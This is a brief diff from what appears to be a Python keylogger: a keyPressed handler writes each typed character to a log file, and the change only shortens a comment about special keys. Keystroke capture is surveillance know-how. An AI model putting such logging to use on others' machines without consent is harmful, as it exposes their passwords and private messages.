@@ -35,7 +35,7 @@ def keyPressed(key):
             char = key.char
             logKey.write(char)
         except:
-            # If it’s a special key (e.g. Enter, Shift), it might not have a char attribute
+            # If it’s a special key it might not have a char attribute
             print("Error getting char")
 
 # Only run this section if the script is executed directly (not imported)
